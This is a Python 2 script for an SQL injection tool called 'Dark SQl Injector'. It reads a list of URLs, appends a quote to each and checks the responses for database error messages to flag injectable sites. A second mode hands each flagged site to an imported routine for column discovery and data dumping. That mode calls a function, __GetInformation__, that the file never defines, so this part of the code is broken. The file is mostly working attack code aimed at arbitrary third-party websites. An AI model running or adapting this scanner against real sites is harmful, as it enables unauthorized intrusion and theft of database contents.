#!/usr/bin/python

import os, sys, subprocess, socket, urllib2, re, time
from sets import Set as set
from order import __VulnerableColumn__

def logo():
        print "\n|---------------------------------------------------------------|"
        print "|                     Dark SQl Injector                         |"
        print "|                       version:1.0.1                           |"
        print "|                             by                                |"
        print "|                     Rahul Pratap Singh                        |"
        print "|                 email:techno.rps@gmail.com                    |"
        print "|                    twitter:@0x62626262                        |"
        print "|                                                               |"
        print "|                         Features:                             |"
        print "|                     --Integer Based                           |"
        print "|                                                               |"
        print "|---------------------------------------------------------------|\n"
      

def timer():
   sec = time.time()
   return sec

if sys.platform == 'linux' or sys.platform == 'linux2':
  subprocess.call("clear", shell=True)
  logo()
else:
  subprocess.call("cls", shell=True)
  logo()

timeout = 60
socket.setdefaulttimeout(timeout)
log = "sqlivuln.txt"
logfile = open(log, "w")
urls = []
vuln = []
orgvulurls = []

# Colours
W  = "\033[0m";  
R  = "\033[31m"; 
G  = "\033[32m"; 
O  = "\033[33m"; 
B  = "\033[34m";
end = "\033[0m";

sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Unable to select' : 'unable to select'}
   
    

if len(sys.argv) != 2:
   print R + "[+]" + end +" Usage: python sqli.py <FILE>"
   print R + "[!]" + end +" Exiting, thanks for using script"
   sys.exit(1)
       
checklist = sys.argv[1]
starttimer = timer()

print G + "[+]" + end + " Available Modes: "
print R + "    1" + end + " Scanning"
print R + "    2" + end + " Dumping Auto Mode"
print G + "[+]" + end + " Enter the mode:",
choice = raw_input()

try:
  check = open(checklist, "r")
  checkline = check.readlines()
  print R + "[!]" + end + " You have",len(checkline),"links to check\n"
except(IOError):
  print "[-] Error, check your path or file name!"
  print "[!] Exiting, thanks for using script"
  sys.exit(1)
 
for url in checkline:
   url = url.replace("\n", "") + "'"
   urls.append(url)  

def INJECTION(url,choice):
   for url in urls:
      try:
         source = urllib2.urlopen(url).read()
         for type,eMSG in sqlerrors.items():
            if re.search(eMSG, source):
               print R + "[+]" + end,url, "Error:", type, B+" ---> SQL Injection Found" + end
               logfile.write(url + "\n")
               if choice == '1':
               	   vuln.append(url)
               if choice == '2':
	               vuln.append(url)
	               tempurl = url.replace("'","")
	               orgvulurls.append(tempurl)
	               __VulnerableColumn__(tempurl)
	               __GetInformation__()
            else:
               pass
      except:
         pass

   

if __name__ == "__main__":
   INJECTION(url,choice)      
   print R+"\n[!] Total Sql injection vul sites: %s" % len(vuln) + end
   vulnerable = list(set(vuln))
   print R+"[+] After removing duplicates: %s" % len(vulnerable) + end
   endtimer = timer()
   print "\n[+] Time used for checking :", int(((endtimer-starttimer) / 60)), "minutes"
   print "[+] Average time per link is :", int(((endtimer-starttimer) / float(len(checkline)))), "seconds"